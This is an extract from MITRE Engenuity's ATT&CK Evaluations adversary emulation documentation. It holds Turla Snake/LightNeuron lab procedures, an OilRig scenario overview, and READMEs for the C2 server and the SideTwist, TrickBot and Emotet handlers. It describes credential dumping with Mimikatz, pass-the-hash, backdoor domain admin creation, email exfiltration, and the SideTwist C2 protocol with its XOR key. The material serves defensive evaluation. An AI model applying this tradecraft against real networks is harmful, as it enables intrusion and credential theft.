Intelligence","p":["https://securelist.com/analysis/publications/65545/the-epic-turla-operation/","https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest.pdf","https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf","https://docs.broadcom.com/doc/waterbug-attack-group","https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/","https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/"]},{"i":"test-10-install-snake-on-first-target","l":"Test 10: Install Snake on First Target","p":["\uD83C\uDFA4 Voice Track:","Test 10 emulates Turla exploiting a vulnerable driver to install the Snake rootkit on the Azuolas system and then performing discovery on Azuolas to discover a file server and associated file server admin."]},{"i":"biohazard-procedures-2","l":":biohazard: Procedures","p":["❗ Verify that File Server Admins is listed as one of the groups that EgleAdmin is a member of.","❗ Verify that the enumerated processes output contains a process running under EgleAdmin","❗ Verify that the home drive is mapped to the file server host berzas (10.100.30.204).","➡️ Return to your Kali C2 server terminal window","➡️ Return to your Kali C2 server terminal window and verify that a new implant session is beaconing back to the C2 server.","➡️ Return to your Kali C2 server terminal window.","➡️ Switch to your RDP session to azuolas as egle.","A new powershell window should pop up. Run the following command to ensure that you are running as nk\\EgleAdmin:","From the egle(❗ NOT egleadmin) powershell terminal, run the following command to execute the Snake rootkit installer with the privilege escalation option:","From your lower Kali C2 terminal window, task the Snake rootkit to run the following process discovery command:","From your smbclient Kali terminal tab, transfer the Snake installer to Azuolas.","nk\\EgleAdmin","Open a Powershell prompt and run the following command:","Open File Explorer and browse to Desktop","Password","Producer1!","This should return output similar to the following:","Username","Wait 1 minute then execute the next discovery command to enumerate EgleAdmin's groups:","Wait 1 minute then execute the next discovery command to the drive mapped to the file server:","When prompted, type in the password for EgleAdmin:","Within the RDP session, go to your Edge window. Perform a hard refresh on the current page by pressing Ctrl+Shift+R."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["C2 communications over HTTP","Disable DSE and Load Rootkit","Driver","Drop DLL","EPIC","Execute commands ExecCmd","File download DownloadFile","Function Hooking","Infinity Hook","Inject Usermodule DLL","Privilege Escalation","Snake Installer","Snake Rootkit","Snake Usermodule DLL","Start Snake Rootkit Driver","Task download","Task execution with optional token impersonation","Token duplication","Trigger injection on network request"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["Report 9: Securelist/Artemon- Uroburos","Report 10: BAE/Artemon- Snake","Report 11: GData- Uroburos","Report 12: CIRCL- TR-25","Report 13: GData- Kernel Protection Mitigation","Report 14: GData- using WinDbg","Report 16: GData- Project Cobra","Report 17: Tetrane- Uroburos with REVEN","Report 18: Talos- Snake Campaign","Report 19: Lastline- Dissecting Turla Rootkit","Report 20: Lastline- Kernel Exploit Makeover","Report 27: GitHub- hfiref0x/TDL","Report 28: CoreLabs- VirtualBox Privilege Escalation","Report 29: Unit42- Acidbox"]},{"i":"test-11-snake-lateral-movement-to-file-server","l":"Test 11: Snake Lateral Movement to File Server","p":["\uD83C\uDFA4 Voice Track:","Test 11 emulates Turla using the discovered admin account to laterally move to the file server and install the Snake rootkit on it, and then using Powershell to perform Active Directory user, group, and computer discovery."]},{"i":"biohazard-procedures-3","l":":biohazard: Procedures","p":["❗ Ensure that Zilvinas' Workstation appears in the Description field for uosis","❗ Verify that Server Management is included in the results.","❗ Verify that you see output. If the implant returns empty output, please contact your lead.","❗ Verify that ZilvinasAdmin shows up in the list of accounts.","➡️ Check the Kali C2 server terminal window and verify that a new implant session is beaconing back to the C2 server.","➡️ RDP into berzas (10.100.30.204) as EgleAdmin:","➡️ Return to your Kali C2 server","➡️ Return to your RDP session to Azuolas (10.100.40.103) as Egle and look for indications of vendor blocking activity.","➡️ Return to your RDP session to berzas (10.100.30.204) as EgleAdmin","Check both the Egle and EgleAdmin RDP windows for indications of the vendor blocking the activity.","Close any spurious windows","Finally, wait 1 minute before tasking Snake to obtain a list of domain computers and some of their information (IP addresses, DNS names, and description).","From your lower Kali C2 control server terminal window, task Snake to check if the ActiveDirectory PowerShell module is installed.","From your smbclient Kali terminal tab, copy PsExec and the second Snake installer to Azuolas.","In the ❗ EgleAdmin Powershell terminal, run the following command to execute PsExec, which will run the Snake installer on the file server berzas:","nk\\EgleAdmin","Open Edge and navigate to https://www.google.com. Perform a search on File server configuration best practices, but don't click on any results.","Open File Explorer and browse to C:\\Windows\\System32. Order files by date.","Password","Producer1!","Username","Wait 1 minute before tasking Snake to collect a list of Active Directory groups containing the word \"management\", as members of these groups will likely have elevated permissions on the network.","Wait 1 minute before tasking Snake to discover domain users. Ensure Zilvinas and ZilvinasAdmin appear in the output.","Wait 1 minute before tasking Snake to obtain the usernames of accounts within the Domain Admins domain group.","Wait 1 minute before tasking Snake to obtain the usernames of accounts within the Server Management domain group. This will instruct Turla on users to target next."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Disable DSE and Load Rootkit","Driver","Drop DLL","Function Hooking","Generic process execution with optional token impersonation","Infinity Hook","Inject Usermodule DLL","Payload download","Powershell execution","Privilege Escalation","Snake Installer","Snake Rootkit","Snake Usermodule DLL","Start Snake Rootkit Driver","Task download","Task execution via cmd","Token duplication","Trigger injection on network request"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://artemonsecurity.com/snake_whitepaper.pdf"]},{"i":"test-12-credential-dumping-lateral-movement-and-persistence","l":"Test 12: Credential Dumping, Lateral Movement, and Persistence","p":["\uD83C\uDFA4 Voice Track:","Test 12 emulates Turla performing credential dumping on the file server, and then performing lateral movement to the domain admin's workstation and performing additional persistence by creating a new domain admin account."]},{"i":"biohazard-procedures-4","l":":biohazard: Procedures","p":["❗ Verify that the password and NTLM hash for ZilvinasAdmin appears in the output.","❗ Verify that we find processes running under ZilvinasAdmin","➡️ Go back to the RDP session to Berzas (10.100.30.204) as EgleAdmin:","➡️ Return to the Kali C2 terminal window and verify that a new implant session is beaconing back to the C2 server.","➡️ Return to your Kali C2 server","➡️ Return to your RDP session to uosis (10.100.40.102) as Zilvinas:","➡️ Start a new RDP session to uosis (10.100.40.102) as Zilvinas:","A new powershell window should pop up. Run the following command to ensure that you are running as nk\\ZilvinasAdmin:","Check both the berzas (10.100.30.204) and uosis (10.100.40.102) RDP sessions for indicators of blocked activity.","Click on the search bar and search for powershell. Right click powershell and then click \"Run as Administrator\".","From the lower terminal window, task Snake to enumerate running processes on the machine to discover processes under ZilvinasAdmin.","From the smbclient Kali terminal tab, copy MimiKatz, PsExec, and the Snake installer, to the file server berzas:","In the admin cmd prompt, run Mimikatz to dump all NTLM hashes from LSASS.exe:","In the Command Prompt, press CTRL+F and in the \"Find what:\" field, enter* Username : ZilvinasAdmin","nk\\EgleAdmin","nk\\Zilvinas","nk\\ZilvinasAdmin","Open command prompt (cmd) as an administrator. If prompted for credentials, use the following:","Open Edge and navigate to https://drebule.nk.local/owa. Log in as Zilvinas:","Open File Explorer and browse to C:\\Windows\\System32. Order files by date.","Password","Producer1!","Producer2!","Spend a couple minutes reading through any unread emails to wait for the implant to start beaconing back to the C2 server.","The output should contain:","This should return output similar to the following:","Username","Wait 1 minute and then in the same elevated cmd prompt, perform pass-the-hash via MimiKatz using ZilvinasAdmin's NTLM hash to run PsExec and install Snake on the target workstation.","Wait 1 minute, then instruct Snake to add Leshy to the Domain Admins group.","Wait 1 minute, then instruct Snake to create a new domain user Leshy using an access token from one of the ZilvinasAdmin processes. Leshy will be used as a backdoor domain admin account for persistence on the domain.","When prompted, type in the username and password for ZilvinasAdmin:","You may have to go up a few results to find the hash and password"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["C2 communications over HTTP","Disable DSE and Load Rootkit","Driver","Drop DLL","File Upload","Function Hooking","Infinity Hook","Inject Usermodule DLL","Mimikatz","Payload download","Privilege Escalation","Snake Installer","Snake Rootkit","Snake Usermodule DLL","Start Snake Rootkit Driver","Task download","Task execution for generic process","Task execution via cmd with optional token impersonation","Token duplication","Trigger injection on network request"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["TBD"]},{"i":"test-13-lateral-movement-to-exchange-server-and-lightneuron-capabilities","l":"Test 13: Lateral Movement to Exchange Server and LightNeuron Capabilities","p":["\uD83C\uDFA4 Voice Track:","Test 13 emulates Turla laterally moving to the Exchange server, installing the LightNeuron implant there, and sending several discovery commands to the LightNeuron implant and collecting and exfiltrating email traffic."]},{"i":"biohazard-procedures-5","l":":biohazard: Procedures","p":["❗ If no response is received after 5 minutes, check the postfix logs on the Kali server to make sure the email was intercepted and processed correctly by LightNeuron.","❗ If the output contains any errors, notify your lead.","❗ Verify that the WMIC output shows a ReturnValue of 0.","➡️ Return to the Kali C2 server lower terminal window. Task the LightNeuron implant to exfiltrate the email log file:","➡️ Return to your Kali C2 server","➡️ Return to your RDP session to uosis (10.100.40.102) as Zilvinas","➡️ Return to your RDP session to uosis (10.100.40.102) as Zilvinas.","➡️ Return to your RDP session to uosis (10.100.40.102) as ZilvinasAdmin.","➡️ Start a new RDP session to drebule (10.100.30.203) as ZilvinasAdmin:","➡️ Switch to your RDP session to drebule (10.100.30.203) to look for any indicators of blocked activity.","➡️ Switch to your RDP window to Azuolas (10.100.40.103) as Egle.","Check your RDP session to drebule (10.100.30.203) to look for any indicators of blocked activity.","Confirm the presence of an msxfer.dat, this implies the LightNeuron transport agent was successfully installed and intercepted the email containing C2 commands","Create a new email:","From the Kali C2 lower terminal window, task LightNeuron to perform system network configuration discovery:","Go to your Edge browser window with the OWA page. If you do not have an Edge browser with OWA open from a previous step, open Edge then navigate to https://drebule.nk.local/owa and log in as Zilvinas:","Go to your Edge browser window. You should still be logged into OWA from earlier.","If there is a reject entry, that means the email, destined for a nonexistent user, was processed by the Exchange server, meaning that LightNeuron was either not successfully installed or is not working properly.","In the elevated cmd prompt, run the following commands to copy LightNeuron files. After each command, check your RDP session to drebule (10.100.30.203) to look for any indicators of blocked vendor activity.","In your Kali terminal window, copy the LightNeuron files to uosis","nk\\Zilvinas","nk\\ZilvinasAdmin","Open File Explorer and browse to C:\\Windows\\serviceprofiles\\networkservice\\appdata\\Roaming\\Microsoft\\Windows","Open File Explorer and browse to C:\\Windows\\System32. Order files by date.","Password","Producer2!","Reply to the email from Zilvinas.","Send the email","Start an elevated command prompt. When prompted for credentials, use:","The email recipient should be the user egle@nk.local","The email subject should be SAP Integration Issue","The file contents will be logged by the control server.❗ Verify that exfil was logged by the control server by checking the terminal window with the server output or by checking the server log file. The logs should contain the password Egle sent to Zilvinas:","The following text should be pasted in as the email body:","The following text should be pasted in as the email reply body:","Username","Wait 1 minute and then run the following command in the elevated cmd prompt to check the installation log for any errors:","Wait 1 minute and then run the following command in the elevated cmd prompt to install LightNeuron remotely using WMI and Powershell:","Wait 1 minute before copying the last config file:","Wait 1 minute before copying the next file (installation script):","Wait 1 minute before copying the next file (LightNeuron companion DLL):","Wait 1 minute before copying the rules file:","You should see the email from Zilvinas@nk.local. Try reloading the page if needed."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Analyze attachment for data from C2","Automated Collection","Check message against rule file","Check signature in image","Companion DLL","Data Staging/Automated Collection","Decode attachment data from base64","Decrypt data in image","Email Hiding Rules","Encode data in base64","Encrypt result of command in image","Execute commands: Cmd ID 3","Execute commands: Cmd ID 5","Extract task from image","Hide result of command in image","Installation Script","LightNeuron","Masquerading legitimate file name","Remote Email Collection","Send message back to C2 server over email","Steganography","Transport Agent"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf"]}],[{"l":"Turla Intelligence Summary"},{"i":"attck-group-id-g0010","l":"ATT&CK Group ID: G0010","p":["Active since at least the early 2000s, Turla is a sophisticated Russian-based threat group that has exploited victims in more than 50 countries. 1 The group has targeted government agencies, diplomatic missions, military groups, research and education facilities, critical infrastructure sectors, and media organizations. 1 2 Turla leverages novel techniques and custom tooling and open-source tools to elude defenses and persist on target networks. 3 4 The group is also known for its adaptability and willingness to evolve behaviors and tools to achieve campaign objectives. 5 6 7 Turla is known for their targeted intrusions and innovative stealth. After establishing a foothold and conducting victim enumeration, Turla persists with a minimal footprint through in-memory or kernel implants. 8 9 Turla executes highly targeted campaigns aimed at exfiltrating sensitive information from Linux and Windows infrastructure. 10 11","Associated Groups: IRON HUNTER, Group 88, Belugasturgeon, Waterbug, WhiteBear, Snake, Krypton, Venomous Bear"]},{"l":"Technique Scope"},{"l":"Key Adversary Report References","p":["1","10","11","12","13","14","15","16","17","18","19","2","20","21","22","23","24","25","26","27","28","29","3","30","31","4","5","6","7","8","9","https://blog.talosintelligence.com/tinyturla/","https://cert.gov.ua/article/5213167","https://dl.acm.org/doi/pdf/10.1145/3603506","https://media.defense.gov/2019/Oct/18/2002197242/-1/-1/0/NSA_CSA_TURLA_20191021%20VER%203%20-%20COPY.PDF","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180251/Penquins_Moonlit_Maze_PDF_eng.pdf","https://securelist.com/analysis/publications/65545/the-epic-turla-operation/","https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments","https://unit42.paloaltonetworks.com/acidbox-rare-malware/","https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-129a","https://www.eset.com/us/about/newsroom/press-releases/cyber-espionage-group-turla-and-its-latest-malware-under-the-microscope-1/","https://www.gdatasoftware.com/blog/2014/03/23966-uroburos-deeper-travel-into-kernel-protection-mitigation","https://www.gdatasoftware.com/blog/2015/01/23926-analysis-of-project-cobra","https://www.hhs.gov/sites/default/files/major-cyber-orgs-of-russian-intelligence-services.pdf","https://www.justice.gov/opa/pr/justice-department-announces-court-authorized-disruption-snake-malware-network-controlled","https://www.kaspersky.com/about/press-releases/2023_apt-q1-2023-playbook-advanced-techniques-broader-horizons-and-new-targets","https://www.lastline.com/labsblog/turla-apt-group-gives-their-kernel-exploit-a-makeover/","https://www.leonardo.com/documents/15646808/16757471/Malware+Technical+Insight+_ Turla+“Penquin_x64”.pdf/524e39d0-029f-1a99-08d5-c013be1b8717?t=1590739252338","https://www.ncsc.gov.uk/static-assets/documents/Turla%20Neuron%20Malware%20Update.pdf","https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/","https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf","https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf","Report Links","Source ID"]},{"i":"connect-with-us","l":"Connect with us \uD83D\uDDE8️","p":["We \uD83D\uDC96 feedback! Let us know how using ATT&CK Evaluation results has helped you and what we can do better.","Email: evals@mitre-engenuity.org Twitter: https://twitter.com/MITREengenuity LinkedIn: https://www.linkedin.com/company/mitre-engenuity/"]}],[{"l":"OilRig","p":["License","Based on open-source intelligence, the ATT&CK ® Evaluations team created the below scenario leveraging techniques seen from OilRig in the wild. We have adapted the scenario based on tools and resources available at the time."]},{"i":"adversary-overview","l":"Adversary Overview \uD83D\uDEE2️","p":["Objectives: OilRig is a cyber threat actor with operations aligning to the strategic objectives of the Iranian government. 1 2 OilRig has been operational since at least 2014 and has a history of widespread impact, with operations directed against financial, government, energy, chemical, telecommunications and other sectors around the globe. 3 OilRig commonly leverages spearphishing and social engineering tactics in their operations, as well as PowerShell backdoors. 4 5 6 The group continues to evolve its tradecraft to evade detection, and utilizes a combination of proprietary malware, customized versions of publicly available tools, and off-the-shelf, multi-purpose software.","Associated Groups: COBALT GYPSY, IRN2, APT34, Helix Kitten"]},{"i":"emulation-overview","l":"Emulation Overview \uD83D\uDCD6","p":["This scenario follows OilRig’s multi-phase approach to exfiltrating sensitive data from a targeted server. OilRig leverages spearphishing to gain initial access onto an administrator’s workstation and deploys their SideTwist malware. Once persistence is established on the victim network, the attackers will escalate privileges and move laterally onto an EWS server. Further enumeration of the EWS server will lead to OilRig’s identification of a SQL server storing confidential critical infrastructure data. Characteristics of this campaign include: custom webshells, Windows and Microsoft 365 exploitation, and key attacker objective on obtaining control of the SQL server to steal victim files.","Operations Flow Diagram"]},{"l":"Quick Links"},{"i":"for-engineers","l":"For Engineers \uD83E\uDDD1‍\uD83D\uDCBB"},{"l":"Resources","p":["The Resources Folder contains the emulated software source code.","The Binaries.zip contains all executables in one zip file for easy download. The password is malware.","All other pre-built executables have been removed. To rebuild the binaries, follow the documentation for the respective binary. A build script has been provided for building all binaries on a Kali Linux host.","This scenario also utilizes Mimikatz, Plink and PsExec as payloads:","Mimikatz","Plink","PsExec.exe"]},{"l":"YARA Rules","p":["YARA rules are provided to assist the community in researching, preventing, and detecting malware specimens used in this emulation plan."]},{"l":"Emulation Key Software","p":["SideTwist- SideTwist is a C-based backdoor that has been used by OilRig since at least 2021 and is purposed for downloading, uploading, command execution, and persistence.","TwoFace- TwoFace is a webshell written in C# used by OilRig for lateral movement since at least 2017.","VALUEVAULT- VALUEVAULT is a Golang version of the Windows Vault Password Dumper credential theft tool developed by Massimiliano Montoro and has been used by OilRig since at least 2019.","RDAT- RDAT is a backdoor used by OilRig for data collection and exfiltration since at least 2017."]},{"l":"Scenario Walkthrough","p":["Emulation Scenario- Step by step walkthrough of scenario's procedures."]},{"i":"for-analysts","l":"For Analysts \uD83D\uDD0E","p":["Operation Flow- High-level summary of the scenario & infrastructure with diagrams.","Intelligence Summary- General overview of the Adversary with links to reporting used throughout the scenario."]},{"i":"connect-with-us","l":"Connect with us \uD83D\uDDE8️","p":["We \uD83D\uDC96 feedback! Let us know how using ATT&CK Evaluation results has helped you and what we can do better.","Email: evals@mitre-engenuity.org Twitter: https://twitter.com/MITREengenuity LinkedIn: https://www.linkedin.com/company/mitre-engenuity/"]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["© 2022 MITRE Engenuity. Approved for Public Release. Document number AT0037.","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CK®","ATT&CK Terms of Use"]}],[{"i":"attck-evaluations-control-server","l":"ATT&CK Evaluations Control Server","p":["This ATT&CK Evaluations Control Server is used to execute behaviors under test during ATT&CK Evaluations.","The Control Server provides features for generating implant stagers, controlling agents, and executing modules.","The Control Server is backed with a REST API to support automation and integration with other tools."]},{"l":"Usage","p":["This repository is meant to act as a submodule within other adversary emulation or ATT&CK evaluation repositories. To use this control server repository, you may either run the binary as is or reference the entire repository as a submodule.","The control server expects the following folder structure for payloads/uploads:","File uploads will be stored in the files subdirectory of the current working directory of the C2 server. The repository already has this directory available, but you will need to create the folder before running the binary from a different location.","Payload downloads will be fetched from the payloads folder of the parent directory of the C2 server's working location. The repository does not contain this payload directory, since the end user will be responsible for providing the payloads according to their specific use case. Ensure that this folder exists in the parent directory when running the C2 server. For example, if the control server is being run from the Resources/control_server directory, the payloads must be placed in Resources/payloads/ in order for the handlers to successfully serve them. The SideTwist handler in particular expects its payloads to be in a separate SideTwist directory under the payloads directory (e.g. Resources/payloads/SideTwist)"]},{"l":"Build from source"},{"l":"Test Instructions","p":["Note: you may need to specify the full path to your golang binary if running under sudo.","For example:"]},{"l":"Usage Examples","p":["Enable C2 handlers and adjust configuration values to change IP address and ports to listen on by editing the config/handler_config.yml file. To enable a handler, set enabled to true, like below:","To disable a handler, set enabled to false, like below:","Start the control server:","Alternatively run direct from source:","Note: you may need to specify the full path to your golang binary if running under sudo.","For example:"]},{"l":"Installation Dependencies","p":["Install Go version 1.15 or higher.","Run tests from the main repository directory. Go should automatically fetch needed dependencies.","Note: you may need to specify the full path to your golang binary if running under sudo.","For example:","Look at the go.mod file if you want to see the dependencies in detail."]},{"i":"attck-evaluations-c2-client","l":"ATT&CK Evaluations C2 Client","p":["This client is provided to interact with the C2 server via its REST API."]},{"l":"Build Instructions","p":["Install dependencies using pip3:"]},{"i":"test-instructions-1","l":"Test Instructions"},{"i":"usage-examples-1","l":"Usage Examples","p":["Enable C2 handlers and adjust configuration values to change IP address and ports to listen on by editing the config/handler_config.yml file. To enable a handler, set enabled to true, like below:","To disable a handler, set enabled to false, like below:","Start the control server:","Establish an implant session","Run an implant program of your choice to connect to the C2 (make sure that the corresponding handler was enabled).","Run the client python script to manage implant sessions.","For specific instructions on tasking a particular implant, reference the appropriate README."]}],[{"i":"attck-evaluations-emotet-handler","l":"ATT&CK Evaluations Emotet Handler","p":["The ATT&CK Evaluations Emotet Handler is used to handle communications between the Emotet Client and control server via a REST API.","The Emotet Handler provides features to communicate with the Emotet Client and forwarding control information to the Control Server.","The Emotet Handler must be run as root because it needs to bind to standard port 80. Optionally, you can start it with a different port and IP address by giving it command line params."]},{"l":"Build from source","p":["go build main.go"]},{"l":"Install dependencies","p":["Install Go version 1.15 or higher.","Enter the control server directory, and then run tests. Go should automatically fetch needed dependencies.","Look at the go.mod file if you want to see the dependencies in detail."]},{"l":"Run Tests"},{"l":"Go Build"},{"l":"Example usage","p":["View functions from emotet_test.go for an example on how to interact with the control server"]}],[{"i":"attck-evaluations-exaramel-for-linux-handler","l":"ATT&CK Evaluations Exaramel for Linux Handler","p":["The ATT&CK Evaluations Exaramel for Linux handler is used to handle communications between the ATT&CK Evaluations Exaramel for Linux client and the Control Server via a REST API.","This handler uses Task IDs to maintain state regarding the tasks that are sent to the client and the responses that are returned. It serves only HTTPS communications.","This handler must be run as root as it is intended to bind to port 443."]},{"l":"Usage","p":["This handler is automatically loaded by the control server when the control server is started."]},{"l":"Tasking Commands","p":["Task commands to the Exaramel for Linux client using evalsC2Client.py:","Note: The ATT&CK Evaluations version of Exaramel for Linux uses a static GUID of: exaramel-implant.","Commands that can be provided to the implant:"]},{"l":"Run Tests","p":["Install Go version 1.15 or higher.","Enter the control server directory, and run Exaramel for Linux tests. Go will automatically fetch dependencies."]},{"l":"Install Dependencies","p":["Dependencies will be automatically installed by Go when running the tests.","The go.mod file contains detailed information on the dependencies."]}],[{"i":"attck-evaluations-trickbot-handler","l":"ATT&CK Evaluations TrickBot Handler","p":["The ATT&CK Evaluations TrickBot Handler is used to handle communications between the Trickbot Client and control server via a REST API.","The TrickBot Handler provides features to communicate with the Trickbot Client and forwarding control information to the Control Server.","The Trickbot Handler must be run as root because it needs to bind to a standard port."]},{"l":"Build from source","p":["go build main.go"]},{"l":"Install dependencies","p":["Install Go version 1.15 or higher.","Enter the control server directory, and then run tests. Go should automatically fetch needed dependencies.","Look at the go.mod file if you want to see the dependencies in detail."]},{"l":"Run Tests"},{"l":"Go Build"},{"l":"Registration Example","p":["On server:","On client or another server shell:"]},{"l":"Get Task Example","p":["On client or another server shell:"]},{"l":"Post Task Output Example","p":["On client or another server shell:"]}],[{"l":"SideTwist handler","p":["The SideTwist C2 handler is the server-side counterpart for the SideTwist implant and is specifically designed to interact with it by sending commands embedded in HTML and receiving the associated output."]},{"l":"Components","p":["The handler consists of a web server that listens on a specified address/port and serves the following URL endpoints:","GET /search/{guid}, where {guid} represents the unique ID of an implant session to register and receive tasks. E.g. the first GET request for /search/1234 will create a new implant session with ID 1234, and subsequent GET requests will simply return tasks.","POST /search/{guid} is used to submit results (task output or file uploads) for the implant with the specified ID.","GET /getFile/{filename} is used to fetch payloads of the name {filename}. Available payloads are listed in the files directory within the main C2 server repo.","GET /logo.png serves the lookalike website logo. This will typically be requested only when using a browser to view the lookalike site."]},{"l":"Usage"},{"l":"Configuration","p":["To enable and configure the SideTwist handler within the control server, edit the config/handler_config.yml from the main C2 server repo. Adjust the SideTwist entry as needed.","Example:","Run the controlServer binary as sudo and look for success messages in starting up the SideTwist handler."]},{"l":"Tasking Implants","p":["To register or receive tasking for an implant session, the SideTwist handler expects a GET request for /search/{guid}. If this is the first time that the SideTwist handler recognizes the implant with id {guid}, then it will set up a new session within the internal C2 REST server and then begin tasking the implant upon subsequent GET requests to the same endpoint.","For example:","As with other C2 handlers, implant tasking is performed by sending requests to the internal REST server using the evalsC2client.py script. The SideTwist handler will allow operators to task the following command types:","101 command arg1 arg2...- the command ID 101 will have the implant execute a shell command with the provided args. Note that a command is required for ID 101.","102 saveAsName|payloadName- the command ID 102 will have the implant request a payload specified by payloadName and save it as saveAsName.","WARNING: the handler does not validate the command structure or payload names/paths, so operators must ensure that the correct names and paths are used, the | character is correctly placed, etc.","103 fileToUpload- the command ID 103 will have the implant upload the specified local file to the C2 server.","104 command arg1 arg2...- the command ID 104 is an alias for command ID 101. Note that a command is required for ID 104.","105- instructs the implant to terminate. Used when the implant is in loop mode.","Examples of valid tasking:","Examples of invalid tasking:","When the implant beacons in with the GET /search/{guid} requests, the returned HTTP response contains an HTML page with an embedded task string that has been encrypted and base64-encoded. The embedded string is placed within script HTML tags, e.g.:","Encryption and decryption are performed by XOR'ing the plaintext/ciphertext with the hardcoded key notmersenne. The underlying plaintext data is the task string that gets processed by the implant and is of the form commandNumber|commandID|base64(command to execute). For instance, the first task assigned to the implant may look something like 1|101|d2hvYW1pLmV4ZSAvYWxs(base64 encoding of whoami.exe /all), and the second task may look something like 2|102|YzpcdXNlcnNccHVibGljXHBheWxvYWQuZXhlfHBheWxvYWQuZXhl(base64 encoding of c:\\users\\public\\payload.exe|payload.exe). Note that if an implant beacons in, but there is no pending task for the session, the empty task string -1|| is returned."]},{"l":"Payloads","p":["Like tasking, requested payloads are XOR-encrypted and base64-encoded before being returned. However, the payload data is not embedded in an HTML page. Instead, the raw encrypted/encoded file data is returned.","SideTwist-specific payloads must be stored within the payloads/SideTwist directory within the parent directory of the control server. For instance, if the control server is being run from the Resources/control_server directory, the payloads must be placed in Resources/payloads/SideTwist/ in order for the SideTwist handler to successfully serve them."]},{"l":"File Uploads and Task Output","p":["When implants send task output or file uploads to the SideTwist C2 handler, they must do so by sending an HTTP POST request to /search/{guid} with their corresponding guid value. The server will not accept task output or file uploads from an implant if no task was assigned to the implant or if the specified task does not expect output (e.g. tasking the implant to terminate itself). The POST data must be a JSON dictionary with one key-value pair - the key is a string representation of the corresponding command number, and the value is a string containing the base64 encoding of the XOR-encrypted output or uploaded file data.","Example (implant abcd submits output thisismyoutput for command number 5):","Upon success, a successful HTTP response code is sent back with an empty response body.","For regular task output, the SideTwist handler will forward the decoded and decrypted output to the REST server. File uploads will be decoded and decrypted before being written to the server's file system.","Note that the file uploads themselves do not contain the file name to save as - this is determined by the handler when tasking the implant with command ID 104. For instance, if the implant is tasked with 104 C:\\path\\to\\file.txt, then the received file upload data will be saved as file.txt within the C2 server's files directory."]},{"l":"Bootstrap Tasking","p":["Since the SideTwist implant beacons back infrequently, the first beacon can be \"wasted\" since all it does is register a session without returning a command. If operators choose to do so, they can register \"bootstrap\" tasks, which will be the first task sent to any new session registered with the sidetwist handler. Note that only one bootstrap task can be registered for the SideTwist handler, and the task will only be sent on the implant's first beacon when registering a session. Subsequent beacons from the same implant will not return this task.","To set a bootstrap task, use the evalsC2client.py script accordingly:","In the example above, all new sidetwist sessions will be tasked with 101 whoami.exe/all. Note that the task syntax must be the same as in regular tasking via --set-task. Subsequent calls to --set-bootstrap-task will overwrite the currently set task.","To view or clear the currently set bootstrap task, run the following:"]},{"l":"Error Messages","p":["In order to maintain some level of secrecy and OpSec, the handler will not return specific error messages in response to HTTP requests. Any specific error messages will be logged to the console and log file on the C2 server itself. The implant and HTTP requests will simply receive a generic error message of Internal server error with HTTP error code 500."]}],[{"l":"OilRig Setup Procedure"},{"l":"Emulation Team Infrastructure","p":["Linux Attack Platform: Kali Linux 2019.2","Mail and Apache Server: Kali Linux 2019.2"]},{"l":"Emulation Team Infrastructure Configuration","p":["This methodology assumes the following static IP address configurations:","Red Team System","IP Address","Linux Attack Platform","192.168.0.4","Mail and Apache Server","192.168.0.5"]},{"l":"A note about red team payloads","p":["This evaluation utilizes payloads that model malware previously used by OilRig.","These utilities include credential dumpers, implants, and file exfiltration.","The Binaries.zip contains all executables in one zip file for easy download. The password is malware.","Implants are configured to connect back to static IP address 192.168.0.4. Build instructions for each payload can be found with source code in their respective directories."]},{"i":"linux-attack-platform-setup--19216804","l":"Linux Attack Platform Setup \\ 192.168.0.4","p":["Download the OilRig Adversary Emulation Library to the /opt/ directory","Use the Linux commands below to populate the binaries in the expected directories for the scenario:","Download Mimikatz to the Resources/payloads/TwoFace/ directory. Rename Mimikatz executable as m64.exe.","Download Plink to the Resources/payloads/SideTwist/ directory","Download PsExec.exe to the Resources/payloads/TwoFace/ directory","Install FreeRDP"]},{"i":"mail-and-file-server-setup--19216805","l":"Mail and File Server Setup \\ 192.168.0.5","p":["Install Apache","Install Postfix","Stage the SideTwist dropper Marketing_Materials.zip to /var/www/html","Run the install-configure-postfix.sh bash script as sudo","Run the setup-apache-fileserver.sh bash script as sudo","Note: You may need to chmod the scripts to allow them to run."]},{"l":"Target Infrastructure","p":["4 targets, all domain joined to the boombox domain:","SQL Server: tested and executed on CentOS 7.9","Domain Controller: tested and executed on Windows Server 2k19 - Build 17763","Exchange Server: tested and executed on Windows Server 2k19 - Build 17763","Exchange Admin Workstation: tested and executed on Windows 10 - Build 17763"]},{"l":"Target Infrastructure Configuration","p":["Target System","Hostname","IP 